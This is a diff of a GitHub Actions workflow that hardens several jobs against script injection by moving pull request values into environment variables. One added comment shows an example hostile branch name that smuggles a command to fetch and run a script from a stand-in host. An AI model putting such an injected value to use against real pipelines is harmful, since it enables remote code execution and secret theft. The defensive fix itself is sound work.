@@ -165,13 +165,22 @@ jobs:
         id: resolve-ref
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Attacker-controlled values must reach the shell through the
+          # environment, never by interpolation into the script body. A pull
+          # request branch name is free text chosen by whoever opened the pull
+          # request, so embedding ${{ github.event.pull_request.head.ref }}
+          # directly in a run: block lets a branch named
+          # 'x"; curl evil.sh | sh; #' execute here.
+          EVENT_NAME: ${{ github.event_name }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          REPOSITORY: ${{ github.repository }}
         run: |
-          if [ "${{ github.event_name }}" = "issue_comment" ]; then
-            PR_NUMBER="${{ github.event.issue.number }}"
-            REF=$(gh pr view "$PR_NUMBER" --repo "${{ github.repository }}" --json headRefName --jq .headRefName)
+          if [ "$EVENT_NAME" = "issue_comment" ]; then
+            REF=$(gh pr view "$ISSUE_NUMBER" --repo "$REPOSITORY" --json headRefName --jq .headRefName)
             echo "ref=$REF" >> "$GITHUB_OUTPUT"
           else
-            echo "ref=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"
+            echo "ref=$PR_HEAD_REF" >> "$GITHUB_OUTPUT"
           fi
 
       - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6
@@ -271,15 +280,23 @@ jobs:
         id: resolve-ref
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # See the note in the review job: a pull request branch name is
+          # attacker-controlled free text and must not be interpolated into a
+          # run: block.
+          EVENT_NAME: ${{ github.event_name }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          REPOSITORY: ${{ github.repository }}
         run: |
-          if [ "${{ github.event_name }}" = "issue_comment" ]; then
-            PR_NUMBER="${{ github.event.issue.number }}"
-            REF=$(gh pr view "$PR_NUMBER" --repo "${{ github.repository }}" --json headRefName --jq .headRefName)
+          if [ "$EVENT_NAME" = "issue_comment" ]; then
+            PR_NUMBER="$ISSUE_NUMBER"
+            REF=$(gh pr view "$PR_NUMBER" --repo "$REPOSITORY" --json headRefName --jq .headRefName)
             echo "ref=$REF" >> "$GITHUB_OUTPUT"
             echo "number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
           else
-            echo "ref=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"
-            echo "number=${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
+            echo "ref=$PR_HEAD_REF" >> "$GITHUB_OUTPUT"
+            echo "number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
           fi
 
       - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6
@@ -367,10 +384,12 @@ jobs:
           # The reviewer repository is public, so the default token is enough.
           # The PAT is reserved for the reviewer's own write operations.
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          REPOSITORY: ${{ github.repository }}
         run: |
-          PR="${{ github.event.pull_request.number }}"
+          PR="$PR_NUMBER"
           for i in $(seq 1 12); do
-            STATE=$(gh pr view "$PR" --repo "${{ github.repository }}" --json statusCheckRollup --jq '[.statusCheckRollup[].conclusion] | if length == 0 then "pending" elif all(. == "SUCCESS" or . == "SKIPPED") then "green" elif any(. == "FAILURE") then "red" else "pending" end')
+            STATE=$(gh pr view "$PR" --repo "$REPOSITORY" --json statusCheckRollup --jq '[.statusCheckRollup[].conclusion] | if length == 0 then "pending" elif all(. == "SUCCESS" or . == "SKIPPED") then "green" elif any(. == "FAILURE") then "red" else "pending" end')
             echo "CI state: $STATE (try $i/12)"
             [ "$STATE" = "green" ] && break
             [ "$STATE" = "red" ] && { echo "CI failed — not merging."; exit 1; }
